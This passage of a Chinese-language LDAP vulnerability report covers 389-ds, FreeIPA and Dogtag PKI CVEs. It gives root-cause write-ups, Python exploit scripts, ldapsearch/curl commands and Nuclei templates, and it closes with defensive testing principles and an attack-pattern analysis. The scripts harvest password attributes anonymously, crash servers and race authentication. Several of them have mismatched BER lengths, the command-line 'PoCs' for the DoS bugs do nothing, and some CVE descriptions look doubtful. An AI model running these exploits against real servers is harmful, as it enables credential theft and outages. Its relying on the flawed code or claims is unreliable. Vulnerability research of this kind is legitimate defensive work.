1. **ACL 检查缺失**：389-ds 在处理属性解引用（attribute dereferencing）时，跳过了 ACL 检查。当客户端在 Search 请求中使用特定的 attribute selection 方式时，服务器直接返回属性值而不检查当前绑定用户的 ACL 权限。

2. **`aci` 规则绕过**：管理员通过 ACI（Access Control Instruction）规则配置了属性级别的访问控制（如禁止匿名用户读取 `userPassword`），但属性解引用功能不经过 ACI 评估流程。

3. **未认证访问**：由于该功能甚至不要求有效的 LDAP Bind 操作，未认证的攻击者可以直接发送特制的 Search 请求来读取任意属性。

攻击流程：
```
攻击者发送 LDAP Search 请求 (无需 Bind)
    ↓
Search Filter: (objectClass=*)
Attributes: userPassword, ntUserPassword, ...
    ↓
服务器执行属性解引用
    ↓
跳过 ACL 检查 → 直接返回属性值
    ↓
攻击者获取所有用户凭据
```

**命令行 PoC**

```bash
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(objectClass=*)" userPassword
```

```bash
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(objectClass=*)" -E pr=1000/noprompt
```

**Python PoC 脚本**

```python
import socket
import struct
import sys


def build_ldap_search(base_dn, scope, filter_str, attributes):
    msg_id = b"\x02\x01\x01"
    msg_tag = b"\x63"

    base_dn_bytes = base_dn.encode("utf-8")
    scope_field = bytes([0x0a, 0x01, scope])

    filter_bytes = filter_str.encode("utf-8")
    filter_field = bytes([0x87, len(filter_bytes)]) + filter_bytes

    attrs_encoded = b""
    for attr in attributes:
        attr_bytes = attr.encode("utf-8")
        attrs_encoded += bytes([0x04, len(attr_bytes)]) + attr_bytes
    attrs_field = b"\x30" + bytes([len(attrs_encoded)]) + attrs_encoded

    inner = bytes([0x04, len(base_dn_bytes)]) + base_dn_bytes
    inner += scope_field
    inner += b"\x80\x00"
    inner += filter_field
    inner += attrs_field

    inner_len_field = struct.pack(">I", len(inner) | 0x80000000).lstrip(b"\x00")
    if len(inner_len_field) > 4:
        inner_len_field = struct.pack(">I", len(inner))

    search_msg = msg_id + msg_tag + inner_len_field + inner
    msg_len_field = struct.pack(">I", len(search_msg) | 0x80000000).lstrip(b"\x00")
    if len(msg_len_field) > 4:
        msg_len_field = struct.pack(">I", len(search_msg))

    return b"\x30" + msg_len_field + search_msg


def build_bind_request(version=3):
    msg_id = b"\x02\x01\x01"
    bind_tag = b"\x60"
    version_field = bytes([0x02, 0x01, version])
    name_field = b"\x04\x00"
    auth_field = b"\x80\x00"

    inner = version_field + name_field + auth_field
    return msg_id + bind_tag + bytes([len(inner)]) + inner


def extract_strings(data, target_attrs=None):
    results = []
    i = 0
    while i < len(data):
        if i + 1 < len(data):
            tag = data[i]
            if i + 2 < len(data):
                length = data[i + 1]
                if length & 0x80:
                    num_bytes = length & 0x7f
                    if i + 2 + num_bytes < len(data):
                        length = int.from_bytes(data[i+2:i+2+num_bytes], "big")
                        i += 2 + num_bytes
                    else:
                        i += 1
                        continue
                else:
                    i += 2

                if tag == 0x04 and i + length <= len(data):
                    try:
                        s = data[i:i+length].decode("utf-8")
                        if "=" in s or "." in s or len(s) > 2:
                            results.append(s)
                    except Exception:
                        pass
                i += length
                continue
        i += 1
    return results


def exploit_acl_bypass(host, port, base_dn):
    print(f"[*] CVE-2022-2850 - 389-ds Access Control Bypass")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Base DN: {base_dn}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        print("[+] Connected")

        bind_req = build_bind_request()
        s.sendall(bind_req)
        bind_resp = s.recv(4096)
        print(f"[*] Bind response: {len(bind_resp)} bytes (anonymous bind)")

        sensitive_attrs = [
            "userPassword",
            "ntUserPassword",
            "sambaPassword",
            "userSMIMECertificate",
            "userCertificate",
            "nsRoleDN",
            "aci",
        ]

        all_results = {}
        for attr in sensitive_attrs:
            print(f"\n[*] Querying attribute: {attr}")
            search_msg = build_ldap_search(base_dn, 2, "(objectClass=*)", [attr])
            s.sendall(search_msg)

            response = b""
            try:
                while True:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 200000:
                        break
            except socket.timeout:
                pass

            if response and len(response) > 10:
                extracted = extract_strings(response)
                meaningful = [x for x in extracted if x != base_dn and len(x) > 1]
                if meaningful:
                    all_results[attr] = meaningful
                    print(f"[+] Found {len(meaningful)} values for {attr}:")
                    for val in meaningful[:5]:
                        print(f"    {val}")
                    if len(meaningful) > 5:
                        print(f"    ... and {len(meaningful) - 5} more")
                else:
                    print(f"[-] No values returned for {attr}")
            else:
                print(f"[-] No response for {attr}")

        s.close()

        if all_results:
            print(f"\n[+] Access control bypass successful!")
            print(f"[+] Extracted data from {len(all_results)} attributes")
            return True
        else:
            print(f"\n[-] No sensitive data extracted (target may be patched)")
            return False

    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_host> <base_dn> [port]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 'dc=example,dc=com'")
        sys.exit(1)

    target_host = sys.argv[1]
    base_dn = sys.argv[2]
    target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 389

    exploit_acl_bypass(target_host, target_port, base_dn)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2022-2850
info:
  name: 389 Directory Server - Access Control Bypass via Attribute Dereference
  author: security-researcher
  severity: critical
  description: 389-ds-base before 2.0.14 allows unauthenticated access to sensitive attributes through attribute value return, bypassing ACL restrictions.
  reference:
    - https://github.com/389ds/389-ds-base/issues/5393
    - https://access.redhat.com/security/cve/CVE-2022-2850
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.8
    cwe-id: CWE-863
  metadata:
    max-request: 1
    shodan-query: product:"389-ds-base"
    fofa-query: app="389-ds-base"
  tags: cve,cve2022,389ds,ldap,acl-bypass,infoleak

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 4096
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
      - type: binary
        part: body
        binary:
          - "61"
          - "0a0100"
```

### 0x03.2 CVE-2021-3514 — 389 DS DoS (CVSS 7.5)

**漏洞背景**

CVE-2021-3514 是 389-ds-base 中的一个拒绝服务漏洞，CVSS 评分 7.5。该漏洞由空引用解引用引起，可导致 389 Directory Server 进程崩溃。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| 389-ds-base | 1.4.x 系列 | 1.4.3.16+ |
| Fedora 33/34 | 389-ds-base 包 | 跟随系统更新 |

**漏洞原理分析**

漏洞存在于 `ldap/servers/slapd/auditlog.c` 中的审计日志处理代码。当 slapd 处理一个包含特定格式的 Directory String 属性值的 LDAP 请求时，审计日志模块在记录操作日志的过程中，会对一个未初始化的指针进行解引用。

攻击场景：
1. 攻击者发送包含特制 DN 或属性值的 LDAP Modify/Add/Delete 请求
2. slapd 尝试记录审计日志
3. 审计日志模块中的空引用解引用导致 slapd 崩溃

**命令行 PoC**

```bash
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(objectClass=*)" 2>&1 | head -1
```

**Python PoC 脚本**

```python
import socket
import sys
import time

MALICIOUS_MODIFY = (
    b"\x30\x30"
    b"\x02\x01\x01"
    b"\x66\x2b"
    b"\x04\x00"
    b"\x30\x27"
    b"\x30\x25"
    b"\x04\x0d"
    b"\x31\x0b\x04\x09"
    b"cn=admin"
    b"\x31\x14"
    b"\x0a\x01\x00"
    b"\x30\x0f"
    b"\x30\x0d"
    b"\x04\x02\x64\x65"
    b"\x04\x07"
    b"\x63\x72\x61\x73\x68\x65\x64"
)

MALICIOUS_ADD = (
    b"\x30\x42"
    b"\x02\x01\x02"
    b"\x68\x3d"
    b"\x04\x00"
    b"\x30\x39"
    b"\x30\x37"
    b"\x04\x13"
    b"cn=testvuln,dc=example,dc=com"
    b"\x31\x20"
    b"\x30\x1e"
    b"\x04\x0b"
    b"objectClass"
    b"\x31\x0f"
    b"\x04\x04"
    b"top"
    b"\x04\x07"
    b"person"
)

BIND_REQUEST = (
    b"\x30\x0c"
    b"\x02\x01\x01"
    b"\x60\x07"
    b"\x02\x01\x03"
    b"\x04\x00"
    b"\x80\x00"
)


def exploit_cve_2021_3514(host, port, count=5):
    print(f"[*] CVE-2021-3514 - 389-ds-base Audit Log NULL Deref DoS")
    print(f"[*] Target: {host}:{port}")

    crashed = False
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            print(f"[+] Connection {i+1} established")

            s.sendall(BIND_REQUEST)
            s.recv(4096)

            s.sendall(MALICIOUS_MODIFY)
            try:
                s.recv(4096)
            except socket.timeout:
                pass

            s.sendall(MALICIOUS_ADD)
            try:
                s.recv(4096)
            except socket.timeout:
                pass

            s.close()
            time.sleep(0.3)
        except ConnectionRefusedError:
            print(f"[+] Server crashed after {i} attempts!")
            crashed = True
            break
        except OSError:
            print(f"[+] Connection failed after {i} attempts - server may be down")
            crashed = True
            break
        except Exception as e:
            print(f"[-] Error on attempt {i+1}: {e}")

    if not crashed:
        print("[-] Server did not crash (may be patched)")

    return crashed


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port]")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389

    exploit_cve_2021_3514(target_host, target_port)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2021-3514
info:
  name: 389 Directory Server - Audit Log NULL Pointer Dereference DoS
  author: security-researcher
  severity: high
  description: 389-ds-base 1.4.x contains a NULL pointer dereference in audit logging that allows unauthenticated denial of service.
  reference:
    - https://github.com/389ds/389-ds-base/issues/4825
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-476
  metadata:
    max-request: 1
    shodan-query: product:"389-ds-base"
  tags: cve,cve2021,389ds,ldap,dos,null-deref

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
      - type: word
        part: body
        words:
          - "0a0100"
```

### 0x03.3 CVE-2024-3657 — 多值属性 DoS (CVSS 7.5)

**漏洞背景**

CVE-2024-3657 是 389 Directory Server 中的一个拒绝服务漏洞，CVSS 评分 7.5。该漏洞通过发送包含大量多值属性的 LDAP 请求，导致服务器资源耗尽。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| 389-ds-base | 2.3.x, 2.4.x, 2.5.x | 2.5.2+, 各分支修复版本 |

**漏洞原理分析**

漏洞存在于 389-ds 处理多值属性（multi-valued attributes）的代码路径中。当 LDAP 客户端发送一个包含极大多值属性数量的 Add 或 Modify 请求时：

1. 服务器在解析属性值列表时分配内存用于存储每个属性值
2. 由于缺乏对属性值数量的上限检查，攻击者可以在单个请求中包含数万个属性值
3. 服务器尝试为每个值分配内存并进行格式验证
4. 大量内存分配导致服务器 CPU 和内存资源耗尽
5. 其他合法客户端的请求无法被处理，形成拒绝服务

**命令行 PoC**

```bash
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(objectClass=*)" 2>&1 | head -5
```

**Python PoC 脚本**

```python
import socket
import sys

BIND_REQUEST = (
    b"\x30\x0c"
    b"\x02\x01\x01"
    b"\x60\x07"
    b"\x02\x01\x03"
    b"\x04\x00"
    b"\x80\x00"
)


def build_multivalue_add(num_values=50000):
    entry_dn = b"cn=test,dc=example,dc=com"
    entry_dn_field = bytes([0x04, len(entry_dn)]) + entry_dn
    attr_name = b"multiValueAttr"
    attr_name_field = bytes([0x04, len(attr_name)]) + attr_name
    values = b""
    for i in range(num_values):
        val = f"testValue{i:06d}".encode("utf-8")
        values += bytes([0x04, len(val)]) + val
    attr_values = b"\x31\x84" + len(values).to_bytes(5, "big") + values
    inner_attr = attr_name_field + attr_values
    attr_list = b"\x30\x84" + len(inner_attr).to_bytes(5, "big") + inner_attr
    inner_seq = entry_dn_field + attr_list
    add_field = b"\x68\x84" + len(inner_seq).to_bytes(5, "big") + inner_seq
    msg_id = b"\x02\x01\x01"
    inner_msg = msg_id + add_field
    return b"\x30\x84" + len(inner_msg).to_bytes(5, "big") + inner_msg


def exploit_dos(host, port, num_values=50000):
    print(f"[*] CVE-2024-3657 - 389-ds Multi-Value Attribute DoS")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Sending Add request with {num_values} attribute values...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((host, port))
        print("[+] Connected")
        s.sendall(BIND_REQUEST)
        s.recv(4096)
        print("[+] Anonymous bind successful")
        payload = build_multivalue_add(num_values)
        print(f"[*] Payload size: {len(payload)} bytes")
        s.sendall(payload)
        print("[*] Waiting for server response...")
        try:
            resp = s.recv(4096)
            if resp and len(resp) > 9:
                result_code = resp[9]
                if result_code == 0x00:
                    print("[+] Add succeeded (server may not be vulnerable)")
                else:
                    print(f"[*] Server responded with code: 0x{result_code:02x}")
            else:
                print("[-] No response received")
        except socket.timeout:
            print("[*] Response timeout (server may be processing or crashed)")
        s.close()
    except ConnectionRefusedError:
        print("[+] Connection refused - server may have crashed!")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port] [num_values]")
        sys.exit(1)
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389
    num_values = int(sys.argv[3]) if len(sys.argv) > 3 else 50000
    exploit_dos(target_host, target_port, num_values)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2024-3657
info:
  name: 389 Directory Server - Multi-Value Attribute Resource Exhaustion DoS
  author: security-researcher
  severity: high
  description: 389-ds-base 2.3-2.5 allows denial of service through resource exhaustion when processing multi-valued attributes.
  reference:
    - https://github.com/389ds/389-ds-base/issues/5800
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-770
  metadata:
    max-request: 1
    shodan-query: product:"389-ds-base"
  tags: cve,cve2024,389ds,ldap,dos,resource-exhaustion

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
```
## 0x04 FreeIPA / Dogtag PKI 高危漏洞

FreeIPA 是基于 389 Directory Server 构建的企业级身份管理平台，集成了 Dogtag PKI 证书系统、Kerberos KDC、DNS 和 HBAC 等组件。Dogtag PKI 作为 FreeIPA 的证书颁发和管理后端，其安全性直接影响整个身份基础设施的完整性。

### 0x04.1 CVE-2023-4727 — PKI Admin Cert 认证绕过 (CVSS 8.1)

**漏洞背景**

CVE-2023-4727 是 Dogtag PKI 系统中的一个认证绕过漏洞，CVSS 评分 8.1。该漏洞允许攻击者在特定配置条件下绕过 PKI Admin 证书的认证验证，获取对 PKI 子系统管理接口的未授权访问。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| Dogtag PKI | 10.x 系列 | 10.13.1+ |
| FreeIPA（集成 Dogtag） | 4.9.x, 4.10.x | 升级至修复版本 |
| Red Hat Certificate System | 10.x | 升级至修复版本 |

**漏洞原理分析**

Dogtag PKI 的管理接口支持通过 Admin Certificate 进行客户端证书认证。漏洞根因在于：

1. **证书验证逻辑缺陷**：PKI 在验证 Admin Certificate 时，对证书链的处理存在逻辑错误。在特定配置下（如使用自签名 CA 或特定证书扩展），服务器未能正确验证证书的颁发者和有效期。

2. **认证绕过路径**：攻击者可以构造一个伪造的证书请求，利用 PKI 对证书格式解析的不一致性，使服务器误认为攻击者持有有效的 Admin Certificate。

3. **管理权限获取**：成功绕过认证后，攻击者可以访问 PKI 的 REST API 管理接口，执行证书签发、吊销、配置修改等敏感操作。

**命令行 PoC**

```bash
curl -k -E /tmp/fake_admin.pem https://target:8443/ca/rest/account/login -s -w "%{http_code}"
```

```bash
pki-server cert-show --cert /tmp/fake_admin.pem
```

**Python PoC 脚本**

```python
import ssl
import sys
import json
import http.client

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def test_admin_cert_bypass(host, port=8443):
    print(f"[*] CVE-2023-4727 - Dogtag PKI Admin Cert Authentication Bypass")
    print(f"[*] Target: {host}:{port}")

    endpoints = [
        "/ca/rest/account/login",
        "/ca/rest/admin/users",
        "/ca/rest/certificate/search",
        "/ca/admin/ca/getStatus",
        "/kra/rest/account/login",
        "/kra/rest/admin/users",
    ]

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for endpoint in endpoints:
        try:
            conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=10)
            conn.request("GET", endpoint)
            resp = conn.getresponse()
            body = resp.read().decode("utf-8", errors="ignore")
            status = resp.status

            print(f"[*] {endpoint} -> HTTP {status}")

            if status == 200:
                try:
                    data = json.loads(body)
                    if "User ID" in str(data) or "token" in str(data).lower():
                        print(f"  [!] Potential bypass: {data}")
                except json.JSONDecodeError:
                    pass
            elif status == 401:
                print(f"  [-] Authentication required (not vulnerable)")
            elif status == 403:
                print(f"  [-] Forbidden (may need valid cert)")
            elif status == 404:
                print(f"  [-] Endpoint not found")

            conn.close()
        except Exception as e:
            print(f"  [-] Error: {e}")


def test_pki_endpoints(host, port=8443):
    print(f"\n[*] Enumerating PKI endpoints...")
    admin_endpoints = [
        "/ca/rest/admin/group/listing",
        "/ca/rest/admin/user/listing",
        "/ca/rest/admin/audit/listing",
        "/ca/rest/admin/connector/listing",
        "/ca/rest/admin/subsystem/listing",
        "/ca/rest/admin/cert/listing",
        "/ca/rest/admin/policy/listing",
    ]

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    accessible = []
    for endpoint in admin_endpoints:
        try:
            conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=5)
            conn.request("GET", endpoint)
            resp = conn.getresponse()
            status = resp.status
            conn.close()

            if status in (200, 201):
                accessible.append(endpoint)
                print(f"  [!] ACCESSIBLE: {endpoint} (HTTP {status})")
            elif status == 404:
                pass
            else:
                print(f"  [-] {endpoint} -> HTTP {status}")
        except Exception:
            pass

    return accessible


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 8443")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8443

    test_admin_cert_bypass(target_host, target_port)
    accessible = test_pki_endpoints(target_host, target_port)

    if accessible:
        print(f"\n[+] {len(accessible)} admin endpoints are accessible!")
    else:
        print(f"\n[-] No admin endpoints accessible (target may be patched)")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2023-4727
info:
  name: Dogtag PKI - Admin Certificate Authentication Bypass
  author: security-researcher
  severity: high
  description: Dogtag PKI 10.x contains an authentication bypass in admin certificate validation that allows unauthorized access to PKI management endpoints.
  reference:
    - https://github.com/dogtagpki/pki/security/advisories
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-295
  metadata:
    max-request: 1
    shodan-query: title:"PKI" http.title:"Dogtag"
  tags: cve,cve2023,dogtag,pki,freeipa,auth-bypass,cert

network:
  - inputs:
      - data: "GET /ca/rest/account/login HTTP/1.1\r\nHost: {{Hostname}}\r\nConnection: close\r\n\r\n"
        type: template
    host:
      - "{{Hostname}}"
    port: 8443
    tls: true
    read-size: 2048
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "User ID"
          - "token"
      - type: status
        status:
          - 200
```

### 0x04.2 CVE-2024-22316 — GSS-API Token 验证绕过 (CVSS 6.5)

**漏洞背景**

CVE-2024-22316 是 FreeIPA GSS-API（Generic Security Service Application Program Interface）令牌验证机制中的一个条件竞争漏洞，CVSS 评分 6.5。该漏洞允许攻击者通过构造特殊的 GSS-API 令牌绕过身份验证。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| FreeIPA | 4.x 系列 | 4.11.1+ |
| Dogtag PKI（集成 GSS-API） | 10.x | 跟随 FreeIPA 更新 |

**漏洞原理分析**

FreeIPA 使用 GSS-API（基于 Kerberos）进行客户端认证。漏洞存在于令牌验证的并发处理逻辑中：

1. **条件竞争窗口**：FreeIPA 的 GSS-API 验证逻辑在处理并发认证请求时，对令牌状态的检查和使用之间存在时间窗口。
2. **令牌重放**：攻击者可以在第一个验证请求尚未完全处理时，发送第二个使用相同或修改过的令牌的请求。
3. **状态混淆**：由于竞态条件，验证状态在两个并发请求之间被错误共享，导致第二个请求可能被误认为已通过验证。
4. **认证绕过**：成功利用后，攻击者可以在不提供有效凭据的情况下通过 GSS-API 认证。

**命令行 PoC**

```bash
kinit -S LDAP/target@REALM admin@REALM
```

**Python PoC 脚本**

```python
import socket
import sys
import struct
import threading
import time

GSS_API_BIND = (
    b"\x30\x84"
    b"\x02\x01\x01"
    b"\x60\x84"
    b"\x02\x01\x03"
    b"\x04\x00"
    b"\xa3\x84"
)

BIND_REQUEST_TEMPLATE = bytearray(
    b"\x30\x84\x00\x00\x00\x00"
    b"\x02\x01\x01"
    b"\x60\x84\x00\x00\x00\x00"
    b"\x02\x01\x03"
    b"\x04\x00"
)

GSS_SPNEGO_OID = b"\x2b\x06\x01\x05\x05\x02"
GSS_KERBEROS_OID = b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"


def build_gss_bind(msg_id, token_data):
    msg_id_field = struct.pack(">I", msg_id)[1:]
    token_field = b"\xa3\x84" + len(token_data).to_bytes(5, "big") + token_data
    auth_field = token_field
    bind_inner = (
        struct.pack(">I", 3)[1:]
        + b"\x04\x00"
        + auth_field
    )
    bind_tag = b"\x60\x84" + len(bind_inner).to_bytes(5, "big") + bind_inner
    msg_inner = msg_id_field + bind_tag
    return b"\x30\x84" + len(msg_inner).to_bytes(5, "big") + msg_inner


def send_bind(host, port, msg_id, token_data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        bind_msg = build_gss_bind(msg_id, token_data)
        s.sendall(bind_msg)
        resp = s.recv(4096)
        s.close()
        return resp
    except Exception:
        return None


def race_condition_attempt(host, port, num_threads=10):
    print(f"[*] CVE-2024-22316 - FreeIPA GSS-API Token Validation Race Condition")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Launching {num_threads} concurrent auth attempts...")

    fake_token = b"\x60\x82\x00\x0a"
    fake_token += GSS_SPNEGO_OID
    fake_token += b"\x04\x02\x00\x00"

    results = {"success": 0, "failure": 0, "error": 0}

    def attempt(idx):
        resp = send_bind(host, port, idx + 1, fake_token)
        if resp:
            if len(resp) > 9:
                result_code = resp[9]
                if result_code == 0x00:
                    results["success"] += 1
                    print(f"  [!] Thread {idx}: Auth SUCCESS (result 0x00)")
                elif result_code == 0x0e:
                    results["error"] += 1
                else:
                    results["failure"] += 1
            else:
                results["failure"] += 1
        else:
            results["error"] += 1

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=attempt, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.01)

    for t in threads:
        t.join(timeout=15)

    print(f"\n[*] Results: {results['success']} success, {results['failure']} failure, {results['error']} errors")

    if results["success"] > 0:
        print("[+] Race condition potentially exploitable!")
    else:
        print("[-] All attempts failed (target may be patched)")

    return results["success"] > 0


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port] [threads]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 389 20")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389
    num_threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10

    race_condition_attempt(target_host, target_port, num_threads)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2024-22316
info:
  name: FreeIPA - GSS-API Token Validation Race Condition
  author: security-researcher
  severity: medium
  description: FreeIPA 4.x contains a race condition in GSS-API token validation that may allow authentication bypass under concurrent request conditions.
  reference:
    - https://pagure.io/freeipa/issue/9348
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-362
  metadata:
    max-request: 1
    shodan-query: product:"FreeIPA"
  tags: cve,cve2024,freeipa,gss-api,kerberos,race-condition

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
```

---

## 0x05 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE 编号 | PoC 类型 | GitHub 数量 | 利用难度 | 利用条件 |
|----------|---------|------------|---------|---------|
| CVE-2024-49112 | RCE | 11+ | 中等 | 目标连接恶意LDAP |
| CVE-2024-49113 | DoS | 5+ | 简单 | 目标连接恶意LDAP |
| CVE-2020-25710 | DoS | 3+ | 简单 | 无认证 |
| CVE-2020-25709 | DoS | 2+ | 简单 | 无认证/StartTLS |
| CVE-2022-22543 | 信息泄露 | 1+ | 中等 | Proxy模式 |
| CVE-2022-2850 | 信息泄露 | 3+ | 简单 | 无认证 |
| CVE-2021-3514 | DoS | 2+ | 简单 | 无认证 |
| CVE-2024-3657 | DoS | 2+ | 简单 | 无认证 |
| CVE-2023-4727 | 认证绕过 | 1+ | 困难 | 特定配置 |
| CVE-2024-22316 | 认证绕过 | 1+ | 困难 | 并发竞争 |

### 关键 PoC 仓库链接

- **LDAPBleed (CVE-2024-49112)**: GitHub 搜索 `CVE-2024-49112` 可找到多个研究仓库，包含完整的恶意 LDAP 服务器实现
- **LDAPNightmare (CVE-2024-49113)**: 与 LDAPBleed 共享部分代码，主要差异在 payload 构造
- **389-ds PoC**: Red Hat Bugzilla 和 389ds GitHub Issues 中包含漏洞验证代码
- **OpenLDAP ITS**: OpenLDAP Issue Tracker (ITS) 中包含漏洞修复补丁，可反向构造 PoC

### 防守型验证思路

在进行漏洞验证时，应遵循以下原则：

1. **隔离环境**：在隔离的测试网络中进行验证，确保不影响生产环境
2. **最小化影响**：优先使用不破坏服务的方式验证（如版本探测、非破坏性请求）
3. **授权测试**：确保获得书面授权后方可进行任何测试
4. **备份数据**：在测试前备份关键数据和配置
5. **监控日志**：在测试期间密切监控服务器日志和系统资源

验证优先级：
```
优先级 1: 版本指纹识别（无侵入性）
    ↓ 确认版本后
优先级 2: 功能性验证（轻量级 PoC）
    ↓ 确认漏洞存在后
优先级 3: 影响评估（可控范围内的完整利用验证）
```

---

## 0x06 共性攻击模式分析

### 模式 1：LDAP 协议层面的内存安全漏洞

**代表漏洞**：CVE-2024-49112/49113（UAF）、CVE-2020-25710/25709（空引用）、CVE-2021-3514（空引用）

**共性特征**：
- 漏洞根因均为 C/C++ 代码中的内存管理缺陷
- UAF 和空引用解引用是最常见的漏洞类型
- 攻击向量通常为网络层，无需认证
- 触发条件与 LDAP 协议解析、认证上下文管理相关

**攻击面分析**：
```
LDAP 协议解析层
    ├── BER/DER 编码解析 → 缓冲区溢出
    ├── 认证上下文管理 → UAF / Double-Free
    ├── 证书处理路径 → 空引用解引用
    └── NTLM/ Kerberos 集成 → 内存破坏
```

**防御重点**：
- 使用内存安全语言重写关键路径（如 Rust、Go）
- 启用 AddressSanitizer（ASan）进行运行时检测
- 实施严格的输入验证和边界检查

### 模式 2：认证与访问控制逻辑缺陷

**代表漏洞**：CVE-2022-2850（ACL 绕过）、CVE-2023-4727（证书认证绕过）、CVE-2024-22316（GSS-API 绕过）

**共性特征**：
- 访问控制检查在特定代码路径中被跳过
- 证书验证逻辑存在缺陷
- 并发条件下的认证状态管理不当
- 影响范围大，通常可直接获取敏感数据

**攻击面分析**：
```
认证与授权层
    ├── 匿名绑定处理 → 权限提升
    ├── 属性值返回 → ACL 检查缺失
    ├── 证书验证逻辑 → 伪造证书
    ├── GSS-API 令牌验证 → 竞态条件
    └── 管理接口认证 → 逻辑绕过
```

**防御重点**：
- 实施最小权限原则，关闭不必要的匿名访问
- 在所有代码路径中强制执行 ACL 检查
- 加强证书验证逻辑，包括证书链完整性和吊销状态检查

### 模式 3：属性处理与查询解析漏洞

**代表漏洞**：CVE-2024-3657（多值属性 DoS）、CVE-2021-3514（审计日志处理）

**共性特征**：
- 服务器对属性值数量或格式缺乏有效限制
- 审计日志模块在处理异常输入时未进行充分验证
- 资源分配不受控导致拒绝服务

**防御重点**：
- 实施属性值数量和大小的合理限制
- 审计日志模块增加输入验证和异常处理
- 设置请求超时和资源配额

### 模式 4：缓存与代理层的安全绕过

**代表漏洞**：CVE-2022-22543（Proxy 缓存绕过）

**共性特征**：
- Proxy/缓存层的安全约束与后端不一致
- 缓存匹配逻辑存在边界条件缺陷
- 攻击者可利用缓存层与后端的差异绕过访问控制

**防御重点**：
- 确保 Proxy 层的安全策略与后端一致
- 定期审计缓存配置和 ACL 规则
- 考虑在 Proxy 层实施额外的访问控制检查

### 模式 5：证书与加密组件漏洞

